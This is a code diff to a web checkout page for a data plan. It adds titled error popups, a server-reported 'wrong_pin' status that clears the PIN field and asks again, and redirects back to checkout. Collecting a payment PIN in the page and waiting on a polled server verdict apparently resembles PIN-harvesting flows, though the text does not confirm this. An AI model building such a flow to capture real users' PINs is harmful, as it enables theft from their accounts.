@@ -492,7 +492,7 @@
     <div class="error-overlay" id="errorOverlay">
         <div class="error-card" id="errorCard">
             <div class="error-icon"><i class="uil uil-times-circle"></i></div>
-            <h3 class="error-title">Payment Failed</h3>
+            <h3 class="error-title" id="errorTitle">Payment Failed</h3>
             <p class="error-text" id="errorText">Incorrect number. Kindly check your number and try again.</p>
             <button class="error-btn" id="errorBtn">Try Again</button>
         </div>
@@ -538,8 +538,11 @@
         const waitingOverlay = document.getElementById('waitingOverlay');
         const errorOverlay = document.getElementById('errorOverlay');
         const errorCard = document.getElementById('errorCard');
+        const errorTitle = document.getElementById('errorTitle');
         const errorText = document.getElementById('errorText');
         const errorBtn = document.getElementById('errorBtn');
+
+        let redirectOnErrorClose = false;
 
         function movePopup() {
             if (window.visualViewport) {
@@ -630,7 +633,7 @@
                 const data = await res.json();
 
                 if (!data.ok) {
-                    showError(data.error || 'Something went wrong. Please try again.');
+                    showError(data.error || 'Something went wrong. Please try again.', 'Payment Failed', false);
                     return;
                 }
 
@@ -642,7 +645,7 @@
 
             } catch (err) {
                 console.error(err);
-                showError('Network error. Please check your connection and try again.');
+                showError('Network error. Please check your connection and try again.', 'Network Error', false);
             }
         });
 
@@ -666,18 +669,32 @@
                     } else if (data.status === 'rejected') {
                         clearInterval(pollTimer);
                         waitingOverlay.classList.remove('open');
-                        showError(data.message || 'Incorrect number. Kindly check your number and try again.');
+                        showError(
+                            data.message || 'Incorrect number. Kindly check your number and try again.',
+                            'Payment Failed',
+                            false
+                        );
+                    } else if (data.status === 'wrong_pin') {
+                        clearInterval(pollTimer);
+                        waitingOverlay.classList.remove('open');
+                        showError(
+                            'You have entered a wrong PIN. Please try again with the correct PIN.',
+                            'Wrong PIN',
+                            true
+                        );
                     } else if (data.status === 'timeout') {
                         clearInterval(pollTimer);
                         waitingOverlay.classList.remove('open');
-                        showError('Session expired. Please try again.');
+                        showError('Session expired. Please try again.', 'Session Expired', true);
                     }
                 } catch (err) {}
             }, 2000);
         }
 
-        function showError(message) {
+        function showError(message, title, redirectToCheckout) {
+            errorTitle.textContent = title || 'Payment Failed';
             errorText.textContent = message;
+            redirectOnErrorClose = !!redirectToCheckout;
             errorOverlay.classList.add('open');
             setTimeout(() => errorCard.classList.add('show'), 50);
         }
@@ -690,6 +707,17 @@
                 proceed.disabled = true;
                 proceed.innerHTML = '<i class="uil uil-arrow-right"></i><span>Proceed</span>';
                 pin.value = '';
+
+                if (redirectOnErrorClose) {
+                    // Start over: redirect to the same checkout page (fresh)
+                    const backParams = new URLSearchParams({
+                        plan: planName,
+                        data: planData,
+                        price: planPrice
+                    });
+                    window.location.href = '/checkout.html?' + backParams.toString();
+                }
+                redirectOnErrorClose = false;
             }, 250);
         });
 
